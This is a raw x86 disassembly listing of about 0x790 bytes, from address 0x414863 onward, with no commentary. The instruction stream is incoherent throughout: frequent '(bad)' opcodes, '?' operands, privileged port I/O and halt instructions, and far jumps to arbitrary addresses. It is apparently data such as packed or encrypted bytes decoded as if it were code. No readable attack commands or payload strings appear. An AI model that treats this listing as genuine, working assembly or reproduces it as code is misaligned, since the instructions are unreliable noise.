  414863:	shr    DWORD PTR [si],1
  414866:	push   ss
  414867:	mov    bl,0xec
  414869:	xor    eax,0x476a4e2b
  41486e:	add    DWORD PTR [ecx-0x68784769],esp
  414874:	jne    0x4148b2
  414876:	fucomi st,st(4)
  414878:	sbb    BYTE PTR [esi-0x7be12b23],dl
  41487e:	xor    al,0x7c
  414880:	mov    gs,WORD PTR [ebp-0x4f0784dc]
  414886:	lock sar DWORD PTR [bp-0x337a],0x55
  41488d:	add    eax,0xb3e3a45b
  414892:	hlt    
  414893:	pop    edx
  414894:	sub    al,0x8b
  414896:	and    DWORD PTR [ebx-0x1141fe8f],0xf
  41489d:	xchg   ebx,eax
  41489e:	out    dx,al
  41489f:	loop   0x41482c
  4148a1:	jge    0x41486e
  4148a3:	or     edx,DWORD PTR [esi+ebp*2]
  4148a6:	xor    BYTE PTR [esi+0x17],cl
  4148a9:	fs retf 0x6f78
  4148ad:	inc    edx
  4148ae:	pop    es
  4148af:	pop    ebx
  4148b0:	and    ebp,DWORD PTR [ebx+0x11bce169]
  4148b6:	les    ebx,FWORD PTR [esi-0x80]
  4148b9:	int3   
  4148ba:	jl     0x41490d
  4148bc:	loop   0x41489e
  4148be:	mov    eax,ds:0x9fe3e559
  4148c3:	test   al,0xcb
  4148c5:	inc    edx
  4148c6:	cmove  ebp,DWORD PTR [ecx]
  4148c9:	mov    ds:0x536de5f0,eax
  4148ce:	inc    ebx
  4148cf:	test   bh,0x1b
  4148d2:	cdq    
  4148d3:	mov    dh,0x55
  4148d5:	pusha  
  4148d6:	js     0x414905
  4148d8:	inc    ebp
  4148d9:	test   al,0x8
  4148db:	add    al,0x29
  4148dd:	stc    
  4148de:	mov    dh,0x98
  4148e0:	(bad)  
  4148e1:	mov    cl,0x77
  4148e3:	pop    ebp
  4148e4:	sbb    al,BYTE PTR [ebx]
  4148e6:	dec    ebp
  4148e7:	popf   
  4148e8:	jle    0x414874
  4148ea:	test   al,0xd2
  4148ec:	stos   BYTE PTR es:[edi],al
  4148ed:	sahf   
  4148ee:	(bad)  
  4148ef:	cld    
  4148f0:	icebp  
  4148f1:	mov    BYTE PTR [edi],cl
  4148f3:	inc    ecx
  4148f4:	pop    ecx
  4148f5:	sbb    eax,0xedbc7873
  4148fa:	aad    0xd3
  4148fc:	cwde   
  4148fd:	das    
  4148fe:	jb     0x414885
  414900:	push   0x32
  414902:	icebp  
  414903:	pop    esp
  414904:	push   cs
  414905:	pop    ecx
  414906:	scas   al,BYTE PTR es:[edi]
  414907:	adc    eax,0x8ec336e6
  41490c:	add    al,BYTE PTR [edi]
  41490e:	outs   dx,BYTE PTR ds:[esi]
  41490f:	jg     0x4148d5
  414911:	ss (bad) 
  414913:	dec    edi
  414914:	xchg   BYTE PTR [eax-0x42888f55],ch
  41491a:	pop    es
  41491b:	jae    0x4148af
  41491d:	inc    edi
  41491e:	push   esp
  41491f:	mov    esp,0x40cce246
  414924:	(bad)  
  414925:	sub    DWORD PTR [esi+0x6b0fe52d],esi
  41492b:	pop    es
  41492c:	popa   
  41492d:	xor    ebx,ebx
  41492f:	ss jmp 0x3212:0x7642cb75
  414937:	retf   
  414938:	jmp    0x6584c86b
  41493d:	lock inc eax
  41493f:	dec    edx
  414940:	adc    ch,BYTE PTR [eax-0x64527b1b]
  414946:	popa   
  414947:	hlt    
  414948:	sbb    dl,ah
  41494a:	or     esi,ecx
  41494c:	pop    ecx
  41494d:	xlat   BYTE PTR ds:[ebx]
  41494e:	mov    ds:0xeba0bd38,al
  414953:	xchg   ecx,eax
  414954:	pushf  
  414955:	pushf  
  414956:	aad    0x44
  414958:	jmp    0x414945
  41495a:	lahf   
  41495b:	sar    BYTE PTR [ebx+0x53],0xa5
  41495f:	mov    esp,0xc4efda92
  414964:	jle    0x414960
  414966:	adc    dh,BYTE PTR [esi]
  414968:	sub    ah,bl
  41496a:	out    dx,eax
  41496b:	out    0xee,al
  41496d:	mov    ebp,0xc45dbfc7
  414972:	jg     0x4149a3
  414974:	lea    esi,[ecx-0x26d54107]
  41497a:	adc    al,0x37
  41497c:	in     eax,dx
  41497d:	loope  0x4149c1
  41497f:	adc    eax,0x8a45583e
  414984:	ss xchg ecx,eax
  414986:	dec    esp
  414987:	lods   eax,DWORD PTR ds:[esi]
  414988:	aad    0x4b
  41498a:	or     edi,DWORD PTR [eax+0x2949826b]
  414990:	lock fisubr DWORD PTR [esi-0x44e7483c]
  414997:	or     BYTE PTR [ebp-0x4be2d287],ah
  41499d:	xlat   BYTE PTR ds:[ebx]
  41499e:	mov    edx,0x7ec4ca5c
  4149a3:	jno    0x414a0e
  4149a5:	out    0xb4,eax
  4149a7:	xor    al,0x99
  4149aa:	pop    eax
  4149ab:	outs   dx,BYTE PTR ds:[esi]
  4149ac:	call   0x15bf8075
  4149b1:	jl     0x414a0d
  4149b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149b4:	sub    eax,0xbcf4c9e7
  4149b9:	shl    DWORD PTR [ecx+0x2c],cl
  4149bc:	(bad)  
  4149bd:	jno    0x414a1c
  4149bf:	push   esp
  4149c0:	das    
  4149c1:	gs sub eax,0x5d6f73bf
  4149c7:	aad    0x27
  4149c9:	inc    edi
  4149ca:	dec    eax
  4149cb:	mov    al,ds:0x8e28f15f
  4149d0:	cdq    
  4149d1:	dec    ecx
  4149d2:	aaa    
  4149d3:	(bad)  
  4149d4:	lahf   
  4149d5:	sub    bh,BYTE PTR [eax]
  4149d7:	jbe    0x4149ea
  4149d9:	xchg   sp,ax
  4149db:	dec    edx
  4149dc:	dec    eax
  4149dd:	cmp    al,BYTE PTR [ebx]
  4149df:	add    DWORD PTR [ebp-0xb],0xa1b4a6e7
  4149e6:	mov    BYTE PTR [ebp+0x61],0x28
  4149ea:	push   ds
  4149eb:	pop    es
  4149ec:	retf   
  4149ed:	cmp    dh,BYTE PTR [esi+0x15832125]
  4149f3:	leave  
  4149f4:	(bad)  
  4149f7:	in     al,0x6f
  4149f9:	fwait
  4149fa:	and    al,0x88
  4149fc:	add    DWORD PTR [esi+0x7f],esp
  4149ff:	push   cs
  414a00:	mov    edi,0xe287914e
  414a05:	xchg   esi,eax
  414a06:	jmp    0x41499e
  414a08:	nop
  414a09:	and    ebp,DWORD PTR [ecx-0x1e]
  414a0c:	mov    ch,0x2d
  414a0e:	or     al,0x9f
  414a10:	mov    ds:0xbd403bd3,al
  414a15:	jno    0x414a25
  414a17:	hlt    
  414a18:	(bad)  
  414a19:	scas   eax,DWORD PTR es:[edi]
  414a1a:	ret    0x1514
  414a1d:	inc    esi
  414a1e:	dec    esi
  414a1f:	scas   al,BYTE PTR es:[edi]
  414a20:	sbb    al,0x21
  414a22:	mov    ?,WORD PTR [edi]
  414a24:	xchg   edi,eax
  414a25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a26:	jbe    0x414a6b
  414a28:	mov    dh,0x6a
  414a2a:	js     0x414a0a
  414a2c:	cmp    BYTE PTR ds:0x2e9fd162,bl
  414a32:	jne    0x414a02
  414a34:	test   al,0xc4
  414a36:	sahf   
  414a37:	lods   al,BYTE PTR ds:[esi]
  414a38:	push   0xe4f9b55a
  414a3d:	retf   
  414a3e:	in     eax,dx
  414a3f:	or     BYTE PTR [ecx],0x7d
  414a42:	stos   DWORD PTR es:[edi],eax
  414a43:	loop   0x414a12
  414a45:	and    BYTE PTR [edi+0x4c],bh
  414a48:	popa   
  414a49:	rcr    ah,cl
  414a4b:	push   es
  414a4c:	add    bh,dl
  414a4e:	and    eax,0x53773287
  414a53:	pop    ss
  414a54:	(bad)  
  414a55:	xor    ebp,DWORD PTR [edi+ecx*8-0x41]
  414a59:	sbb    eax,0xcc2fae40
  414a5e:	add    eax,0x61dbdf98
  414a63:	fstp   DWORD PTR ds:0x99d72610
  414a69:	push   0x5
  414a6b:	fstp   TBYTE PTR ds:0x9cebe413
  414a71:	and    ebx,DWORD PTR [edx-0x7f20209a]
  414a77:	and    BYTE PTR [ebp+0x4242b126],cl
  414a7d:	std    
  414a7e:	or     eax,0x255e5f8b
  414a83:	(bad)  
  414a84:	xchg   esp,eax
  414a85:	dec    esp
  414a86:	loope  0x414ab5
  414a88:	mov    esp,ecx
  414a8a:	ins    BYTE PTR es:[edi],dx
  414a8b:	out    0x9e,eax
  414a8d:	and    bh,BYTE PTR [edx-0x3fe95c74]
  414a93:	call   0x47cb:0x93ae9ee9
  414a9a:	inc    esi
  414a9b:	mov    WORD PTR [esi],gs
  414a9d:	sub    dl,BYTE PTR [eax]
  414a9f:	ins    BYTE PTR es:[edi],dx
  414aa0:	ret    
  414aa1:	pusha  
  414aa2:	xchg   esi,eax
  414aa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414aa4:	xchg   edi,eax
  414aa5:	lahf   
  414aa6:	iret   
  414aa7:	pushf  
  414aa8:	imul   edi,DWORD PTR [ebp+0x79],0xd8ba3918
  414aaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ab0:	jmp    0xcb06:0xe58588e5
  414ab7:	mov    ebx,0xf56290cb
  414abc:	mov    ebx,0x1afdc13c
  414ac1:	in     al,dx
  414ac2:	cli    
  414ac3:	addr16 gs loop 0x414a80
  414ac7:	enter  0x95d2,0xbe
  414acb:	jg     0x414ae6
  414acd:	cmp    al,0xae
  414acf:	aad    0xe0
  414ad1:	les    esp,FWORD PTR [ecx-0x4a]
  414ad4:	xchg   esi,eax
  414ad5:	gs push 0x21916e18
  414adb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414adc:	arpl   WORD PTR [ecx],si
  414ade:	pop    edx
  414adf:	sahf   
  414ae0:	in     eax,0x38
  414ae2:	(bad)  
  414ae3:	jnp    0x414b10
  414ae5:	xchg   eax,eax
  414ae7:	retf   0xa2cc
  414aea:	out    dx,al
  414aeb:	or     DWORD PTR [ebx+0x1f],esi
  414aee:	call   FWORD PTR [esi-0x72]
  414af1:	add    BYTE PTR ss:[ebp+0x15d3e3af],dh
  414af8:	add    al,0x71
  414afa:	mov    ah,ch
  414afc:	icebp  
  414afd:	jbe    0x414ad1
  414aff:	adc    BYTE PTR [bp+di+0x16],al
  414b03:	ins    DWORD PTR es:[edi],dx
  414b04:	ss add al,0x8
  414b07:	adc    dh,BYTE PTR [edx+0x695639b6]
  414b0d:	cs pop esp
  414b0f:	dec    ebx
  414b10:	mov    edx,0xc31d2c20
  414b15:	mov    al,0xcc
  414b17:	xchg   ebp,eax
  414b18:	dec    esi
  414b19:	daa    
  414b1a:	ret    
  414b1b:	pop    esp
  414b1c:	jae    0x414b2d
  414b1e:	and    ecx,esi
  414b20:	xchg   edx,eax
  414b21:	push   ss
  414b22:	or     eax,0xc66c6394
  414b27:	test   al,0xea
  414b29:	inc    eax
  414b2a:	push   ds
  414b2b:	dec    esi
  414b2c:	or     al,0x85
  414b2e:	and    eax,0x50bc845c
  414b33:	dec    ebx
  414b34:	xlat   BYTE PTR ds:[ebx]
  414b35:	mul    DWORD PTR [edx+ecx*2+0x1b9b040e]
  414b3c:	push   ecx
  414b3d:	cli    
  414b3e:	sub    cl,BYTE PTR [esi-0xa530179]
  414b44:	push   esi
  414b45:	fs jae 0x414b05
  414b48:	fstp   TBYTE PTR [edi-0x6beecb53]
  414b4e:	sbb    eax,0x5ad123fe
  414b53:	arpl   WORD PTR [ecx+0x67b1304e],dx
  414b59:	jne    0x414ae1
  414b5b:	shr    DWORD PTR [edi],1
  414b5d:	popa   
  414b5e:	mov    edi,0x3949b119
  414b63:	dec    esi
  414b64:	jmp    0x52bd:0x5463ded9
  414b6b:	jnp    0x414baa
  414b6d:	sar    edi,cl
  414b6f:	mov    al,ds:0x38985545
  414b74:	sbb    cl,BYTE PTR [ebx-0x47ed9be0]
  414b7a:	test   edi,edx
  414b7c:	test   eax,0x66ceeaf8
  414b81:	shr    BYTE PTR [eax-0x17],0x1f
  414b85:	xor    ah,BYTE PTR [ebp+0x21]
  414b88:	dec    edi
  414b89:	js     0x414b0c
  414b8b:	ins    BYTE PTR es:[edi],dx
  414b8c:	dec    esi
  414b8d:	push   ebx
  414b8e:	xlat   BYTE PTR ds:[ebx]
  414b8f:	and    DWORD PTR [ecx-0x1b90fa8a],esi
  414b95:	and    esi,0x34
  414b98:	cli    
  414b99:	cld    
  414b9a:	adc    ch,BYTE PTR [ebx-0xb2fe570]
  414ba0:	repnz xchg ebp,eax
  414ba2:	hlt    
  414ba3:	outs   dx,DWORD PTR ds:[esi]
  414ba4:	bound  edx,QWORD PTR [eax]
  414ba6:	and    ecx,DWORD PTR [ecx-0x1f]
  414ba9:	cmp    BYTE PTR [edx+eiz*2],ah
  414bac:	fnstsw WORD PTR [edx-0x54]
  414baf:	lahf   
  414bb0:	inc    esi
  414bb1:	iret   
  414bb2:	aad    0xe6
  414bb4:	repz inc ebp
  414bb6:	fs (bad) 
  414bb8:	pop    ds
  414bb9:	std    
  414bba:	mov    esi,0x9a9ec347
  414bbf:	inc    eax
  414bc0:	pop    edx
  414bc1:	std    
  414bc2:	fadd   st(4),st
  414bc4:	loope  0x414b58
  414bc6:	sub    dh,BYTE PTR [ebp-0x9bfb604]
  414bcc:	test   edi,0xb427b977
  414bd2:	sub    ah,ah
  414bd4:	xor    al,0x8d
  414bd6:	mov    eax,ds:0x5535010d
  414bdb:	les    edi,FWORD PTR [edx+0x8e5997f]
  414be1:	push   edi
  414be2:	sub    BYTE PTR es:[edi],dl
  414be5:	add    eax,0x93805970
  414bea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414beb:	adc    al,0xc4
  414bed:	dec    esi
  414bee:	and    ecx,DWORD PTR ds:0xfdc50580
  414bf4:	push   esp
  414bf5:	mov    bl,BYTE PTR [esi+0x1e]
  414bf8:	xor    BYTE PTR [ebx+0x68],ah
  414bfb:	inc    ecx
  414bfc:	(bad)  
  414bfd:	push   ss
  414bfe:	pop    edx
  414bff:	add    ebx,DWORD PTR [eax]
  414c01:	push   ss
  414c02:	push   esi
  414c03:	ins    BYTE PTR es:[edi],dx
  414c04:	push   ds
  414c05:	mov    ecx,0x322ff199
  414c0a:	mov    eax,ds:0x7ab8e602
  414c0f:	adc    eax,esp
  414c11:	fsub   st,st(5)
  414c13:	loope  0x414bd0
  414c15:	loopne 0x414c7a
  414c17:	mov    esp,0x2bb00ab2
  414c1c:	(bad)  
  414c1d:	mov    ebp,0x7a3f5851
  414c22:	test   eax,0x4433935e
  414c27:	in     al,dx
  414c28:	mov    dl,BYTE PTR [ecx]
  414c2a:	push   0xffffffd1
  414c2c:	lds    edi,FWORD PTR [edx]
  414c2e:	xchg   ebp,eax
  414c2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c30:	mov    al,0x9f
  414c32:	popa   
  414c33:	repnz mov bl,0xe9
  414c36:	pop    ebx
  414c37:	push   edi
  414c38:	in     eax,dx
  414c39:	jbe    0x414c59
  414c3b:	inc    esi
  414c3c:	(bad)  
  414c3d:	xor    eax,0x55763834
  414c42:	add    BYTE PTR [eax+ebx*2-0x4f],bl
  414c46:	cwde   
  414c47:	sub    eax,0xf68d7b1e
  414c4c:	dec    esi
  414c4d:	cmp    DWORD PTR [ecx+0x5b6c5d50],edx
  414c53:	xchg   DWORD PTR [ecx],eax
  414c55:	xchg   esp,eax
  414c56:	mov    bl,0x4d
  414c58:	jmp    0xf0e37486
  414c5d:	stos   BYTE PTR es:[edi],al
  414c5e:	fidiv  DWORD PTR [edx]
  414c60:	sbb    ebx,eax
  414c62:	clc    
  414c63:	popa   
  414c64:	loop   0x414c29
  414c66:	mov    edx,es
  414c68:	sbb    ax,0x2695
  414c6c:	fs ret 
  414c6e:	jg     0x414c41
  414c70:	adc    eax,0x8af82f4f
  414c75:	push   esi
  414c76:	and    eax,DWORD PTR [ecx]
  414c78:	inc    ebp
  414c79:	pop    es
  414c7a:	sbb    bl,BYTE PTR [esi]
  414c7c:	loopne 0x414c3d
  414c7e:	aaa    
  414c7f:	fs nop
  414c81:	mov    DWORD PTR [edi],eax
  414c83:	in     al,dx
  414c84:	fs push edx
  414c86:	inc    ebx
  414c87:	push   ecx
  414c88:	fs dec edx
  414c8a:	(bad)  
  414c8b:	in     al,dx
  414c8c:	(bad)  
  414c8d:	ss add al,0x30
  414c90:	test   ebx,edi
  414c92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c93:	sbb    BYTE PTR [eax-0x66],dh
  414c96:	or     al,0x2d
  414c98:	or     al,0xe3
  414c9a:	nop
  414c9b:	es cmc 
  414c9d:	(bad)  
  414c9e:	cs xor eax,0xf729add
  414ca4:	adc    eax,0xf692af4a
  414ca9:	xor    al,0x7e
  414cab:	enter  0xc759,0x73
  414caf:	jo     0x414c31
  414cb1:	xor    al,0xeb
  414cb3:	aaa    
  414cb4:	retf   0xa6c3
  414cb7:	fiadd  DWORD PTR [ecx-0x30]
  414cba:	iret   
  414cbb:	js     0x414c7f
  414cbd:	mov    ah,0x93
  414cbf:	(bad)  
  414cc0:	shl    BYTE PTR [ebp-0x62c4a547],0x2a
  414cc7:	or     eax,0x91351a7
  414ccc:	and    ebp,ebx
  414cce:	aas    
  414ccf:	jecxz  0x414d1e
  414cd1:	out    0x4c,al
  414cd3:	inc    eax
  414cd4:	ins    DWORD PTR es:[edi],dx
  414cd5:	shl    BYTE PTR [edx],0x8e
  414cd8:	test   cl,bl
  414cda:	mov    BYTE PTR [edi],bh
  414cdc:	xor    DWORD PTR [esi+0x54e8f89],esi
  414ce2:	jle    0x414cb1
  414ce4:	pop    edx
  414ce5:	jl     0x414cf4
  414ce7:	push   edx
  414ce8:	loopne 0x414cf5
  414cea:	add    ebp,DWORD PTR [ecx-0x2a]
  414ced:	xchg   esi,eax
  414cee:	repnz sub edi,DWORD PTR [ecx+0x47]
  414cf2:	lods   al,BYTE PTR ds:[esi]
  414cf3:	repnz rcr BYTE PTR [ebp-0x3a],0xb0
  414cf8:	push   0xffffffde
  414cfa:	ja     0x414cc3
  414cfc:	jo     0x414cf5
  414cfe:	xor    ch,ch
  414d00:	ins    BYTE PTR es:[edi],dx
  414d01:	(bad)  
  414d02:	pop    esi
  414d03:	jae    0x414ca6
  414d05:	scas   eax,DWORD PTR es:[edi]
  414d06:	sbb    edx,0xbc95a709
  414d0c:	jmp    0x9ea7:0x4fdb8d48
  414d13:	dec    edx
  414d14:	lock ss icebp 
  414d17:	jp     0x414cc5
  414d19:	add    eax,0x5462bf0
  414d1e:	inc    ecx
  414d1f:	in     al,0xc5
  414d21:	cld    
  414d22:	fcomp  DWORD PTR [ecx-0x7e]
  414d25:	or     ebx,DWORD PTR [ebp+0x75]
  414d28:	(bad)  
  414d29:	js     0x414ccd
  414d2b:	dec    eax
  414d2c:	daa    
  414d2d:	or     bl,ch
  414d2f:	xchg   ebp,eax
  414d30:	or     BYTE PTR [esi-0x214ea0c1],0x74
  414d37:	inc    edi
  414d38:	into   
  414d39:	push   edx
  414d3a:	sub    al,0x6e
  414d3c:	or     ah,ah
  414d3e:	push   ebx
  414d3f:	aas    
  414d40:	imul   ebp,DWORD PTR [esi-0x6e81a9f3],0x51
  414d47:	(bad)  
  414d49:	popa   
  414d4a:	mov    WORD PTR [edi-0x1f],fs
  414d4d:	and    al,0xf5
  414d4f:	in     al,dx
  414d50:	sbb    DWORD PTR [ebp-0x45],esp
  414d53:	aaa    
  414d54:	push   esp
  414d55:	outs   dx,DWORD PTR ds:[esi]
  414d56:	inc    ebx
  414d57:	jno    0x414d7d
  414d59:	in     eax,dx
  414d5a:	adc    al,0xd1
  414d5c:	ficom  WORD PTR [ebp+0x5adf3b84]
  414d62:	push   0x54
  414d64:	sub    ch,BYTE PTR [ebp+0x268dba9c]
  414d6a:	outs   dx,DWORD PTR ds:[esi]
  414d6b:	repnz mov dh,0x8d
  414d6e:	sbb    DWORD PTR [edi+0x18],edx
  414d71:	mov    edx,0xe6e134a0
  414d76:	adc    bh,BYTE PTR [ebp+0x717edb48]
  414d7c:	mov    ?,WORD PTR [edi+0x17f37855]
  414d82:	imul   esi,DWORD PTR fs:[esi],0xb1063d15
  414d89:	repz fsubr st,st(1)
  414d8c:	mov    cl,0x9d
  414d8e:	jl     0x414d3a
  414d90:	mov    BYTE PTR ds:0x6e6c6863,bh
  414d96:	hlt    
  414d97:	sub    al,BYTE PTR [ebx-0x1d]
  414d9a:	or     eax,0xfe04aab2
  414d9f:	std    
  414da0:	or     dl,BYTE PTR ds:0x346418b3
  414da6:	cmp    dl,BYTE PTR cs:[eax+0x142a5586]
  414dad:	xchg   ecx,eax
  414dae:	cmp    eax,0x1ebed748
  414db3:	mov    eax,ds:0xa187824
  414db8:	fdiv   DWORD PTR [ecx+0x7c25f442]
  414dbe:	int3   
  414dbf:	fwait
  414dc0:	shl    ah,0x88
  414dc3:	scas   eax,DWORD PTR es:[edi]
  414dc4:	cs fwait
  414dc6:	das    
  414dc7:	dec    edi
  414dc8:	aam    0x58
  414dca:	inc    ebp
  414dcb:	ins    BYTE PTR es:[edi],dx
  414dcc:	xor    DWORD PTR [ebp+ebx*4-0x2af41f0e],ecx
  414dd3:	xchg   edx,eax
  414dd4:	paddw  mm2,mm6
  414dd7:	jle    0x414df5
  414dd9:	stc    
  414dda:	in     al,0x11
  414ddc:	lds    eax,FWORD PTR [eax-0x7202e6b]
  414de2:	jbe    0x414e63
  414de4:	cld    
  414de5:	ret    0xacf3
  414de8:	aaa    
  414de9:	aam    0x88
  414deb:	mov    bh,0xe4
  414ded:	and    DWORD PTR [ecx+0x2],esp
  414df0:	inc    esp
  414df1:	mov    edx,0xa94cc7f4
  414df6:	into   
  414df7:	jne    0x414dcd
  414df9:	out    0xc,eax
  414dfb:	xchg   edx,eax
  414dfc:	pop    ecx
  414dfd:	out    dx,eax
  414dfe:	ss xchg ebx,eax
  414e00:	ds out 0xe4,al
  414e03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e04:	adc    eax,0xcc1a31b3
  414e09:	sub    DWORD PTR [edx+0x280c2dae],ebp
  414e0f:	xchg   esi,eax
  414e10:	jnp    0x414e6f
  414e12:	mov    bh,0x7a
  414e14:	add    al,0x7
  414e16:	ja     0x414e40
  414e18:	and    eax,0x66a32ab
  414e1d:	stos   BYTE PTR es:[edi],al
  414e1e:	repz mov al,ds:0x7e4ed161
  414e24:	scas   eax,DWORD PTR es:[edi]
  414e25:	call   0xdcc6:0xe83f7d2c
  414e2c:	mov    ds:0x4513997c,al
  414e31:	push   0x71
  414e33:	adc    al,0x99
  414e35:	imul   ecx,DWORD PTR [ecx],0x41
  414e38:	jno    0x414e56
  414e3a:	mov    edx,0x27cd8d12
  414e3f:	mov    al,ds:0x39582760
  414e44:	sahf   
  414e45:	adc    DWORD PTR [eax+0x480f7d1b],ebp
  414e4b:	mov    ch,ah
  414e4d:	pushf  
  414e4e:	or     bl,BYTE PTR [edx+0x23cad658]
  414e54:	int    0xe7
  414e56:	je     0x414e2d
  414e58:	mov    ebp,0x16dd9d1e
  414e5d:	xor    eax,0x9b123572
  414e62:	sbb    eax,0x9cd0a12a
  414e67:	loop   0x414ed7
  414e69:	mov    al,0x41
  414e6b:	mov    bl,0x97
  414e6d:	lds    edi,FWORD PTR [ebx]
  414e6f:	es in  al,0xb
  414e72:	mov    BYTE PTR [ebx+0x29],ah
  414e75:	adc    dl,ah
  414e77:	(bad)  
  414e78:	pop    edi
  414e79:	iret   
  414e7a:	popf   
  414e7b:	cmc    
  414e7c:	push   esp
  414e7d:	aad    0xb2
  414e7f:	test   DWORD PTR [eax],0x810e7200
  414e85:	or     DWORD PTR [edi+0x6358c8da],edx
  414e8b:	jmp    0x4767:0xe58e11a2
  414e92:	test   al,0x20
  414e94:	jb     0x414e64
  414e96:	mov    al,0xdd
  414e98:	idiv   DWORD PTR [ecx]
  414e9a:	idiv   BYTE PTR [eax+0x514f71f2]
  414ea0:	sub    al,bl
  414ea2:	push   ds
  414ea3:	jp     0x414e73
  414ea5:	out    dx,al
  414ea6:	les    edx,FWORD PTR [edx]
  414ea8:	jne    0x414f0c
  414eaa:	jns    0x414e6f
  414eac:	adc    esi,DWORD PTR [ebp+0x5]
  414eaf:	xor    dh,BYTE PTR [ecx+0x20]
  414eb2:	adc    eax,0x39e47aff
  414eb7:	pushf  
  414eb8:	xchg   edx,eax
  414eb9:	std    
  414eba:	inc    ebx
  414ebb:	ins    BYTE PTR es:[edi],dx
  414ebc:	add    ebx,DWORD PTR [edi]
  414ebe:	xor    eax,0x733de6cf
  414ec3:	ret    
  414ec4:	lea    edx,[ebx+ecx*1+0xd]
  414ec8:	adc    esp,esp
  414eca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ecb:	xor    al,0x6a
  414ecd:	sbb    DWORD PTR [ecx],ebx
  414ecf:	lock cdq 
  414ed1:	jb     0x414e95
  414ed3:	adc    BYTE PTR [ebp-0x14],0xce
  414ed7:	in     al,0xe
  414ed9:	hlt    
  414eda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414edb:	ja     0x414f0d
  414edd:	ja     0x414e8e
  414edf:	hlt    
  414ee0:	pusha  
  414ee1:	and    BYTE PTR [ebx],al
  414ee3:	pop    esp
  414ee4:	pushf  
  414ee5:	shr    BYTE PTR [eax-0xbfc9a8e],1
  414eeb:	stos   BYTE PTR es:[edi],al
  414eec:	stos   DWORD PTR es:[edi],eax
  414eed:	cmp    BYTE PTR [esi],dh
  414eef:	xchg   ebp,eax
  414ef0:	xchg   DWORD PTR [esi],ebx
  414ef2:	jp     0x414e7d
  414ef4:	push   eax
  414ef5:	push   ds
  414ef6:	and    esi,ebx
  414ef8:	mov    cl,0x36
  414efa:	add    eax,0x5fb519e7
  414eff:	jmp    0x414ebb
  414f01:	jecxz  0x414f53
  414f03:	jnp    0x414ed5
  414f05:	jno    0x414e87
  414f07:	loopne 0x414f4f
  414f09:	and    ebp,eax
  414f0b:	cmp    edx,DWORD PTR [ebx]
  414f0d:	jns    0x414f28
  414f0f:	out    0x1a,al
  414f11:	out    dx,eax
  414f12:	ins    DWORD PTR es:[edi],dx
  414f13:	and    bh,BYTE PTR [edx+0x5d]
  414f16:	xchg   ecx,eax
  414f17:	push   esi
  414f18:	mov    bh,0xc
  414f1a:	adc    ch,BYTE PTR [ebp+edx*2-0x32fd39cc]
  414f21:	xchg   esp,eax
  414f22:	and    BYTE PTR [esi],ah
  414f24:	(bad)  
  414f25:	clc    
  414f26:	ins    DWORD PTR es:[edi],dx
  414f27:	fwait
  414f28:	dec    esi
  414f29:	aad    0x3f
  414f2b:	cmp    eax,0xb4b1f135
  414f30:	jg     0x414ec4
  414f32:	mov    esp,0x7b23d44f
  414f37:	scas   al,BYTE PTR es:[edi]
  414f38:	into   
  414f39:	and    edx,DWORD PTR [ebx+0x300c2de]
  414f3f:	bound  ebx,QWORD PTR [edx+0x3b]
  414f42:	sub    ebx,ebp
  414f44:	jo     0x414ec9
  414f46:	add    bh,BYTE PTR es:[ebx]
  414f49:	jecxz  0x414f27
  414f4b:	pusha  
  414f4c:	dec    esp
  414f4d:	adc    eax,0xee139907
  414f52:	pop    ds
  414f53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f54:	fmul   st(5),st
  414f56:	cmp    ebp,eax
  414f58:	retf   0xb618
  414f5b:	mov    dh,0x9e
  414f5d:	std    
  414f5e:	es gs imul esi,esi,0x14
  414f63:	repz int3 
  414f65:	pop    edx
  414f66:	sub    DWORD PTR [ecx],0xffffffc4
  414f69:	jo     0x414f06
  414f6b:	mov    eax,0x7339ad53
  414f70:	jecxz  0x414f76
  414f72:	add    esi,ecx
  414f74:	lahf   
  414f75:	je     0x414fa7
  414f77:	out    0x1,eax
  414f79:	adc    DWORD PTR [ecx-0x631adff2],esi
  414f7f:	daa    
  414f80:	outs   dx,BYTE PTR ds:[esi]
  414f81:	mov    ds:0xb67d1a91,al
  414f86:	or     ebp,edx
  414f88:	shl    DWORD PTR [ecx],1
  414f8a:	push   edx
  414f8b:	daa    
  414f8c:	inc    ecx
  414f8d:	mov    edi,0xe5608cc8
  414f92:	or     ecx,eax
  414f94:	push   ebp
  414f95:	stos   BYTE PTR es:[edi],al
  414f96:	lods   eax,DWORD PTR ds:[esi]
  414f97:	test   al,0x70
  414f99:	cmp    eax,edx
  414f9b:	dec    edx
  414f9c:	add    BYTE PTR ds:0x94148f,cl
  414fa2:	mov    edx,0x816d7e8a
  414fa7:	mov    al,0x80
  414fa9:	mov    al,ds:0x3f7de32
  414fae:	push   0x27
  414fb0:	setnp  ch
  414fb3:	out    0xd2,al
  414fb5:	push   ecx
  414fb6:	pop    eax
  414fb7:	sbb    DWORD PTR [ebx+0x2],eax
  414fba:	dec    edx
  414fbb:	imul   edi,DWORD PTR [esi+edi*1+0x22af0909],0x7b
  414fc3:	jno    0x414fc7
  414fc5:	(bad)  
  414fc6:	pop    ds
  414fc7:	fnsave [ecx-0x7128d782]
  414fcd:	sti    
  414fce:	push   ebp
  414fcf:	div    BYTE PTR [edi-0x4d]
  414fd2:	pop    edx
  414fd3:	lds    ecx,FWORD PTR [edx+0x646c97ef]
  414fd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fda:	fiadd  DWORD PTR [esi-0x59]
  414fdd:	mov    ch,0xb5
  414fdf:	mov    dh,0xe7
  414fe1:	cmp    DWORD PTR [ecx+0x25200b02],esi
  414fe7:	ss inc eax
  414fe9:	jae    0x414f97
  414feb:	int3   
  414fec:	inc    edi
  414fed:	hlt    
  414fee:	ds dec edi
  414ff0:	cwde   
  414ff1:	xchg   dh,bl
  414ff3:	add    DWORD PTR fs:[edi-0x21],esp
  414ff7:	mov    ds:0xa633c389,al
